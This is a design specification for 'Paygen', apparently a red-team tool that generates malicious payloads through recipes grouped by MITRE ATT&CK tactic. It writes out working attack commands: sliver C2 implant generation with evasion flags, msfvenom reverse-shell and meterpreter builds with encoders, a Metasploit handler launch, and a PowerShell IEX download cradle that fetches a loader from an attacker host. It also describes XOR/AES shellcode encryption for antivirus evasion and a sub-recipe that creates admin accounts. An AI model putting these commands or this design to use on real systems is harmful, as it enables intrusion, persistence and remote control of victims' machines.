# Paygen - Payload Generation Framework

A menu-driven TUI tool for generating and customizing malicious payloads with MITRE ATT&CK context and effectiveness ratings.

---

## Project Overview

**Repository**: Private GitHub repository  
**Language**: Python  
**Interface**: Terminal User Interface (TUI)  
**Purpose**: Modular payload generation with recipe-based configuration system

---

## Technical Stack

### Core Technologies

- **Language**: Python 3.10+
- **TUI Framework**: Textual (or Rich/py_tui as alternatives)
- **Recipe Format**: YAML
- **Cross-Compilation**: PyInstaller or Nuitka
- **Cryptography**: PyCryptodome (for shellcode encryption)

### Key Libraries

- YAML parsing: `PyYAML`
- Parameter validation: Custom validators
- File operations: `pathlib`, `shutil`
- Templating: `Jinja2` (for source code generation)

---

## Architecture

### Directory Structure

```
paygen/
├── src/
│   ├── main.py                 # Entry point
│   ├── tui/                    # TUI interface components
│   │   ├── menu.py            # Main menu system
│   │   ├── recipe_selector.py # Recipe browsing/selection
│   │   └── param_input.py     # Parameter input forms
│   ├── core/
│   │   ├── recipe_loader.py   # Load and parse YAML recipes
│   │   ├── payload_builder.py # Generate final payloads
│   │   ├── validator.py       # Parameter validation
│   │   ├── preprocessor.py    # Handle encryption/preprocessing
│   │   └── command_executor.py # Execute command-based recipes
│   └── utils/
│       ├── crypto.py          # Encryption utilities
│       └── templates.py       # Template rendering
├── recipes/                    # Recipe definitions
│   ├── initial_access/
│   ├── execution/
│   ├── persistence/
│   ├── privilege_escalation/
│   ├── defense_evasion/
│   ├── credential_access/
│   ├── discovery/
│   ├── lateral_movement/
│   ├── collection/
│   ├── command_and_control/
│   └── exfiltration/
├── payloads/                   # Source code templates
│   ├── process_injection/
│   ├── printspoofer/
│   └── ...
├── output/                     # Generated payloads (gitignored)
├── tests/
├── requirements.txt
├── README.md
└── config.yaml                 # Global configuration
```

---

## Recipe System

### Recipe Types

Paygen supports two types of recipes:

1. **Template-Based Recipes**: Generate payloads from source code templates (C, C#, PowerShell, etc.)
2. **Command-Based Recipes**: Execute external tools/commands to generate payloads (sliver, msfvenom, etc.)

Both types share the same metadata structure (MITRE mapping, effectiveness, artifacts) but differ in generation method.

---

### Template-Based Recipe Schema (YAML)

```yaml
# recipes/privilege_escalation/printspoofer.yaml

recipe_type: "template"  # template | command

name: "PrintSpoofer Privilege Escalation"
description: |
  Exploits the Print Spooler service to escalate privileges from
  SERVICE to SYSTEM. Effective on Windows Server 2019 and below.
  Less effective on modern Windows 11 with patches applied.

mitre:
  tactic: "TA0004 - Privilege Escalation"
  technique: "T1068 - Exploitation for Privilege Escalation"

effectiveness: "medium"  # low | medium | high

artifacts:
  - "Named pipe creation: \\.\pipe\printspoofer"
  - "Spawned SYSTEM process visible in process tree"
  - "Event ID 4688 (Process Creation) with elevated privileges"
  - "Potential Sysmon Event ID 17/18 (Pipe Created/Connected)"

parameters:
  - name: "lhost"
    type: "ip"
    description: "Attacker IP address"
    required: true
    validation: "ipv4"

  - name: "lport"
    type: "port"
    description: "Listener port"
    required: true
    validation: "port_range"
    default: 4444

  - name: "output_dir"
    type: "path"
    description: "Directory to save compiled payload"
    required: true
    default: "./output"

sub_recipes:
  - name: "Reverse Shell"
    description: "Creates a reverse shell connection to attacker"
    source_template: "payloads/printspoofer/reverse_shell.c"
    preprocessing:
      - type: "none"

  - name: "Create Admin User"
    description: "Creates a new local administrator account"
    source_template: "payloads/printspoofer/create_user.c"
    parameters:
      - name: "username"
        type: "string"
        description: "New admin username"
        required: true
      - name: "password"
        type: "string"
        description: "New admin password"
        required: true
        sensitive: true
    preprocessing:
      - type: "none"

  - name: "XOR Encrypted Shellcode"
    description: "Encrypts shellcode with XOR before injection"
    source_template: "payloads/printspoofer/xor_shellcode.c"
    parameters:
      - name: "shellcode_file"
        type: "file"
        description: "Path to raw shellcode binary"
        required: true
      - name: "xor_key"
        type: "hex"
        description: "XOR encryption key (hex)"
        required: false
        auto_generate: true
    preprocessing:
      - type: "xor_encrypt"
        input: "shellcode_file"
        key: "xor_key"

  - name: "AES Encrypted Shellcode"
    description: "Encrypts shellcode with AES-256 before injection"
    source_template: "payloads/printspoofer/aes_shellcode.c"
    parameters:
      - name: "shellcode_file"
        type: "file"
        description: "Path to raw shellcode binary"
        required: true
      - name: "aes_key"
        type: "hex"
        description: "AES-256 key (64 hex chars)"
        required: false
        auto_generate: true
    preprocessing:
      - type: "aes_encrypt"
        input: "shellcode_file"
        key: "aes_key"

output:
  type: "file"  # file | stdout | both
  filename_pattern: "{recipe_name}_{timestamp}.exe"
  compile_command: "x86_64-w64-mingw32-gcc {source} -o {output}"

launch_instructions: |
  # Remote execution from memory (PowerShell):
  IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:8000/loader.ps1')
```

---

### Command-Based Recipe Schema (YAML)

```yaml
# recipes/command_and_control/sliver_implant.yaml

recipe_type: "command" # template | command

name: "Sliver HTTP(S) Implant"
description: |
  Generates a Sliver C2 implant with HTTP(S) communication.
  Highly effective and feature-rich C2 framework with excellent
  OPSEC capabilities. Supports multiple protocols and evasion techniques.

mitre:
  tactic: "TA0011 - Command and Control"
  technique: "T1071.001 - Application Layer Protocol: Web Protocols"

effectiveness: "high" # low | medium | high

artifacts:
  - "Outbound HTTP/HTTPS connections to C2 server"
  - "Persistent service/scheduled task (if configured)"
  - "Network beacon traffic patterns"
  - "Process injection artifacts (if using process migration)"

# Tool dependencies - checked before recipe execution
dependencies:
  - tool: "sliver-server"
    check_command: "which sliver-server"
    install_hint: "Install from: https://github.com/BishopFox/sliver"

parameters:
  - name: "c2_address"
    type: "string"
    description: "C2 server address (domain or IP)"
    required: true
    example: "attacker.example.com"

  - name: "c2_port"
    type: "port"
    description: "C2 listener port"
    required: true
    default: 443

  - name: "protocol"
    type: "choice"
    description: "Communication protocol"
    required: true
    choices: ["http", "https"]
    default: "https"

  - name: "arch"
    type: "choice"
    description: "Target architecture"
    required: true
    choices: ["amd64", "386"]
    default: "amd64"

  - name: "os"
    type: "choice"
    description: "Target operating system"
    required: true
    choices: ["windows", "linux", "darwin"]
    default: "windows"

  - name: "format"
    type: "choice"
    description: "Output format"
    required: true
    choices: ["exe", "shared", "shellcode", "service"]
    default: "exe"

  - name: "evasion"
    type: "bool"
    description: "Enable anti-virus evasion techniques"
    required: false
    default: true

  - name: "output_dir"
    type: "path"
    description: "Directory to save generated implant"
    required: true
    default: "./output"

# Command generation uses Jinja2 templating
generation_command: |
  sliver-server << 'EOF'
  generate --{{ protocol }} {{ c2_address }}:{{ c2_port }} \
    --os {{ os }} \
    --arch {{ arch }} \
    --format {{ format }} \
    {% if evasion %}--skip-symbols --debug {% endif %}\
    --save {{ output_dir }}/{{ output_filename }}
  exit
  EOF

# Optional: Sub-recipes for command-based recipes
sub_recipes:
  - name: "DNS C2 Channel"
    description: "Use DNS for C2 communication (stealthier)"
    generation_command: |
      sliver-server << 'EOF'
      generate --dns {{ c2_address }} \
        --os {{ os }} \
        --arch {{ arch }} \
        --format {{ format }} \
        --save {{ output_dir }}/{{ output_filename }}
      exit
      EOF
    parameters:
      - name: "c2_address"
        type: "string"
        description: "DNS C2 domain"
        required: true

  - name: "Mutual TLS"
    description: "Use mTLS for encrypted C2 communication"
    generation_command: |
      sliver-server << 'EOF'
      generate --mtls {{ c2_address }}:{{ c2_port }} \
        --os {{ os }} \
        --arch {{ arch }} \
        --format {{ format }} \
        --save {{ output_dir }}/{{ output_filename }}
      exit
      EOF

output:
  type: "file"
  filename_pattern: "sliver_{os}_{arch}_{timestamp}.{format}"
  # For command-based recipes, output is determined by the command itself

launch_instructions: |
  # Start Sliver listener first:
  sliver-server
  > {{ protocol }} -L {{ c2_address }} -l {{ c2_port }}

  # Execute implant on target system
  # Windows: .\{{ output_filename }}
  # Linux: chmod +x {{ output_filename }} && ./{{ output_filename }}
```

---

### Additional Command-Based Recipe Examples

```yaml
# recipes/execution/msfvenom_stageless.yaml

recipe_type: "command"

name: "Msfvenom Stageless Reverse Shell"
description: |
  Generates a stageless reverse shell payload using msfvenom.
  Medium effectiveness due to common AV signatures.

mitre:
  tactic: "TA0002 - Execution"
  technique: "T1059 - Command and Scripting Interpreter"

effectiveness: "medium"

artifacts:
  - "Metasploit framework signatures in payload"
  - "Outbound connection to handler"
  - "Common shellcode patterns detectable by AV"

dependencies:
  - tool: "msfvenom"
    check_command: "which msfvenom"
    install_hint: "Install Metasploit Framework"

parameters:
  - name: "lhost"
    type: "ip"
    description: "Listener IP address"
    required: true
    validation: "ipv4"

  - name: "lport"
    type: "port"
    description: "Listener port"
    required: true
    default: 4444

  - name: "payload_type"
    type: "choice"
    description: "Payload type"
    required: true
    choices:
      - "windows/x64/meterpreter_reverse_tcp"
      - "windows/x64/shell_reverse_tcp"
      - "linux/x64/shell_reverse_tcp"
      - "python/meterpreter_reverse_tcp"
    default: "windows/x64/meterpreter_reverse_tcp"

  - name: "encoder"
    type: "choice"
    description: "Encoder for evasion"
    required: false
    choices: ["none", "x86/shikata_ga_nai", "x64/xor_dynamic"]
    default: "none"

  - name: "iterations"
    type: "integer"
    description: "Encoding iterations"
    required: false
    default: 1
    range: [1, 10]

  - name: "format"
    type: "choice"
    description: "Output format"
    required: true
    choices: ["exe", "dll", "raw", "ps1", "python"]
    default: "exe"

  - name: "output_dir"
    type: "path"
    description: "Output directory"
    required: true
    default: "./output"

generation_command: |
  msfvenom -p {{ payload_type }} \
    LHOST={{ lhost }} LPORT={{ lport }} \
    {% if encoder != 'none' %}-e {{ encoder }} -i {{ iterations }}{% endif %} \
    -f {{ format }} \
    -o {{ output_dir }}/{{ output_filename }}

output:
  type: "file"
  filename_pattern: "msfvenom_{timestamp}.{format}"

launch_instructions: |
  # Start Metasploit handler:
  msfconsole -q -x "use exploit/multi/handler; \
    set payload {{ payload_type }}; \
    set LHOST {{ lhost }}; \
    set LPORT {{ lport }}; \
    exploit"
```

### Parameter Types & Validation

| Type      | Validation         | Example                              |
| --------- | ------------------ | ------------------------------------ |
| `ip`      | IPv4 format        | `192.168.1.100`                      |
| `port`    | 1-65535 range      | `4444`                               |
| `string`  | Any text           | `admin_user`                         |
| `file`    | Path exists        | `/tmp/shellcode.bin`                 |
| `path`    | Valid directory    | `./output`                           |
| `hex`     | Hexadecimal string | `deadbeef`                           |
| `bool`    | true/false         | `true`                               |
| `choice`  | One of preset list | `https` (from ["http", "https"])     |
| `integer` | Whole number       | `5` (optionally with range: [1, 10]) |

### Preprocessing Operations

| Type            | Description      | Use Case             |
| --------------- | ---------------- | -------------------- |
| `none`          | No preprocessing | Plain source code    |
| `xor_encrypt`   | XOR cipher       | Simple obfuscation   |
| `aes_encrypt`   | AES-256-CBC      | Strong encryption    |
| `base64_encode` | Base64 encoding  | Bypass basic filters |
| `compression`   | gzip compression | Reduce payload size  |

---

## User Workflow

### 1. Launch TUI

```bash
python src/main.py
```

### 2. Navigation Flow

```
┌─────────────────────────────────────┐
│      PAYGEN - Main Menu             │
├─────────────────────────────────────┤
│ Select MITRE Tactic:                │
│                                     │
│ → TA0004 - Privilege Escalation (5) │
│   TA0005 - Defense Evasion (12)    │
│   TA0002 - Execution (8)           │
│   TA0003 - Persistence (6)         │
│   ...                              │
└─────────────────────────────────────┘

┌─────────────────────────────────────┐
│   Privilege Escalation Payloads     │
├─────────────────────────────────────┤
│ Sorted by Effectiveness:            │
│                                     │
│ [HIGH] Token Impersonation          │
│ [HIGH] UAC Bypass - CMSTPLUA        │
│ → [MEDIUM] PrintSpoofer             │
│ [MEDIUM] AlwaysInstallElevated      │
│ [LOW] DLL Hijacking - Generic       │
└─────────────────────────────────────┘
```

### 3. Recipe Configuration

- Display recipe description, MITRE info, effectiveness, artifacts
- Prompt for parameters (with validation)
- Multi-select sub-recipes to combine
- Preview parameter inheritance

### 4. Payload Generation

- Run preprocessing (encryption, encoding, etc.)
- Inject parameters into source templates
- Compile payload (if needed)
- Save to `output_dir`
- Display launch instructions to stdout

---

## Menu System

### Grouping & Sorting Logic

1. **Primary Grouping**: MITRE Tactic
2. **Primary Sorting**: Effectiveness (High → Medium → Low)
3. **Secondary Sorting**: Alphabetical within same effectiveness level

### Example Menu Ordering

```
TA0004 - Privilege Escalation/
  [HIGH]
    - Potato Family Exploits
    - Token Impersonation
    - UAC Bypass - CMSTPLUA
  [MEDIUM]
    - AlwaysInstallElevated
    - PrintSpoofer
    - Unquoted Service Path
  [LOW]
    - DLL Hijacking - Generic
    - Scheduled Task Abuse
```

---

## Sub-Recipe System

### Combination Logic

- Users can select **multiple sub-recipes** simultaneously
- Sub-recipes act as "modules" that combine into final payload
- Each sub-recipe contributes a code segment
- All share parent recipe parameters

### Example: Process Injection

```
Parent Recipe: Process Injection
Parameters: [target_pid, lhost, lport, output_dir]

User Selects:
  ☑ AES Encrypted Shellcode
  ☑ Sandbox Evasion - Sleep
  ☑ PPID Spoofing

Final Payload = Base Template + AES Module + Sleep Module + PPID Module
```

---

## Output Behavior

### Standard Output

- **File**: Compiled payload saved to `output_dir/filename`
- **Stdout**: Remote execution instructions (PowerShell, bash, etc.)

### Example Output

```
[+] Payload generated successfully!
[+] Location: ./output/printspoofer_20251118_143022.exe
[+] Size: 45KB
[+] SHA256: a3f5c8d9e2b1...

[*] Launch remotely from memory:

    IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100:8000/loader.ps1')
```

---

## Recipe Development Guidelines

### Adding New Recipes

1. **Create YAML file** in appropriate MITRE tactic directory
2. **Define metadata**: name, description, MITRE mapping, effectiveness
3. **Specify parameters**: types, validation, defaults
4. **Create source template** in `payloads/` directory
5. **Add sub-recipes** if modular components exist
6. **Document artifacts**: What defenders will see
7. **Test validation**: Ensure parameter validation works
8. **Update README**: Document new payload in repo README

### Template Variable Syntax (Jinja2)

```c
// payloads/printspoofer/reverse_shell.c
#define LHOST "{{ lhost }}"
#define LPORT {{ lport }}

{% if xor_key %}
unsigned char shellcode[] = { {{ encrypted_shellcode }} };
unsigned char key = 0x{{ xor_key }};
{% else %}
unsigned char shellcode[] = { {{ raw_shellcode }} };
{% endif %}
```

---

## Implementation Phases

### Phase 1: Core Infrastructure ✓

- [x] Define project structure
- [ ] Set up Python project with dependencies
- [ ] Create recipe schema and example YAML files (both template and command types)
- [ ] Implement recipe loader and YAML parser
- [ ] Build parameter validation system
- [ ] Implement command executor with dependency checking

### Phase 2: TUI Development

- [ ] Build main menu navigation (MITRE tactics)
- [ ] Implement recipe browser with sorting
- [ ] Create parameter input forms with validation (including choice/integer types)
- [ ] Add sub-recipe multi-select interface
- [ ] Display recipe metadata (description, artifacts, dependencies, etc.)

### Phase 3: Payload Generation

- [ ] Implement preprocessing pipeline (encryption, encoding) for template-based
- [ ] Build template rendering engine (Jinja2) for both source and commands
- [ ] Add compilation wrapper for cross-platform (template-based)
- [ ] Implement command execution engine (command-based)
- [ ] Create output directory management
- [ ] Generate launch instructions

### Phase 4: Recipe Library

- [ ] Create 3-5 example template-based recipes per MITRE tactic
- [ ] Create 3-5 example command-based recipes (sliver, msfvenom, etc.)
- [ ] Add corresponding source templates for template-based recipes
- [ ] Document each payload thoroughly
- [ ] Include effectiveness ratings and artifacts

### Phase 5: Polish & Distribution

- [ ] Add comprehensive error handling
- [ ] Implement dependency checking for command-based recipes
- [ ] Create user documentation
- [ ] Set up cross-compilation builds (Windows, Linux)
- [ ] Add configuration file support
- [ ] Implement recipe validation tool (validate both types)
- [ ] Create Nix package for reproducible builds and deployment

---

## Nix Packaging

Paygen will be packaged as a Nix derivation for reproducible builds and easy deployment across NixOS systems.

### Nix Package Features

- **Reproducible builds**: Exact same output every time
- **Dependency isolation**: All dependencies managed by Nix
- **Easy installation**: Single command to install on any system with Nix
- **Development shell**: Instant development environment with all tools

### Package Structure

The Nix package will include:
- Python interpreter and all dependencies (PyYAML, Jinja2, Textual, etc.)
- All recipe YAML files
- Payload templates
- Optional: Cross-compilation toolchains (mingw-w64, etc.)
- Optional: External tools (msfvenom, sliver) as optional dependencies

### Usage with Nix

```bash
# Install from local directory
nix profile install .

# Run directly without installing
nix run .

# Enter development environment
nix develop
```

The Nix derivation will use `pyproject.toml` for Python package metadata.

---

## Security & OpSec Considerations

- **Output directory**: Added to `.gitignore` (never commit generated payloads)
- **Sensitive parameters**: Marked as `sensitive: true`, not logged
- **Compilation**: Support cross-compilation to avoid Windows VM requirement
- **Encryption keys**: Auto-generate by default, optional manual specification
- **Source control**: All recipes/templates in private GitHub repo

---

## Testing Strategy

- **Unit tests**: Recipe loader, validators, preprocessors
- **Integration tests**: End-to-end payload generation
- **Recipe validation**: Automated checks for YAML schema compliance
- **TUI testing**: Manual testing of navigation flows
- **Payload testing**: Verify generated payloads compile correctly

---

## Future Enhancements

- [ ] Recipe marketplace/sharing system
- [ ] Built-in listener management
- [ ] Automatic msfvenom integration
- [ ] Docker containerization for compilation
- [ ] Recipe versioning and updates
- [ ] OPSEC scoring system
- [ ] Integration with C2 frameworks
- [ ] Custom encoder/packer plugins
